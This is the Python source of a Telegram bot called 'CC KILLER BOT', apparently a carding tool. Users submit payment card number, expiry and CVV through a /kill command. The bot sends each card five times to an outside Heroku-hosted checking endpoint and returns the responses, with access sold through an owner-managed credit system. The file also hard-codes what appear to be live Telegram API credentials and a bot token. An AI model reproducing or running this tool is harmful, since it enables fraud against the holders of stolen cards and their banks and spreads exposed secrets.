from pyrogram import Client, filters
import requests
import time

app = Client(
    "my_bot",
    api_id=24509589,
    api_hash="717cf21d94c4934bcbe1eaa1ad86ae75",
    bot_token="7386696229:AAFwcMx6q3xr5lY5daaTdvLLgqR_cDIfSjs"
)

OWNER_ID = 7427691214

user_credits = {}

@app.on_message(filters.command("add") & filters.user(OWNER_ID))
def add_credits(client, message):
    try:
        _, user_id, credits = message.text.split(" ")
        user_id = int(user_id)
        credits = int(credits)

        user_credits[user_id] = credits
        message.reply_text(f"**User {user_id} has been assigned {credits} credits.**")
    except ValueError:
        message.reply_text("**Invalid command format. Use: /add id_number credits**")

@app.on_message(filters.command("remove") & filters.user(OWNER_ID))
def remove_credits(client, message):
    try:
        _, user_id, credits = message.text.split(" ")
        user_id = int(user_id)
        credits = int(credits)

        if user_id in user_credits:
            user_credits[user_id] -= credits
            if user_credits[user_id] <= 0:
                del user_credits[user_id]
            message.reply_text(f"**Removed {credits} credits from user {user_id}.**")
        else:
            message.reply_text(f"**User {user_id} not found.**")
    except ValueError:
        message.reply_text("**Invalid command format. Use: /remove id_number credits**")

@app.on_message(filters.command("start"))
def start_command(client, message):
    message.reply_text("**WELCOME TO THE CC KILLER BOT. USE COMMAND /kill cc|mm|yyyy|cvv**")

@app.on_message(filters.command("kill"))
def kill_gate(client, message):
    user_id = message.from_user.id

    if user_id == OWNER_ID:
        is_owner = True
    else:
        credits = user_credits.get(user_id, 0)
        is_owner = False

        if credits <= 0:
            message.reply_text("**You don't have enough credits to use this command.**")
            return

    card_details = message.text.split(" ", 1)[1]

    # Initial processing message
    processing_message = message.reply_text("**CC KILLER GATE\nProcessing your request...**")

    results = []

    for i in range(5):
        # Step message (not editing but updating results list)
        results.append(f"**Processing request {i+1}**")

        time.sleep(1)  # Adjust the delay if needed

        url = f"https://ugin-376ec3a40d16.herokuapp.com/cvv?cc={card_details}"
        response = requests.get(url)

        if response.status_code == 200:
            data = response.json()
            full_card_details = card_details
            error_code = data["error"]["code"]
            error_message = data["error"]["message"]

            result = f"""
**┏━━━━━━━⍟
┃#CC KILL GATE ☠️
┗━━━━━━━━━━━⊛
CARD:- {full_card_details}
RESPONSE:- {error_code}
MSG:- {error_message}**
"""
            results.append(result)
        else:
            results.append("**Failed to connect to the API. Please try again later.**")

        if not is_owner:
            user_credits[user_id] -= 1

    # Send the final result after all checks
    final_result = "\n".join(results)
    processing_message.edit_text(final_result)

app.run()
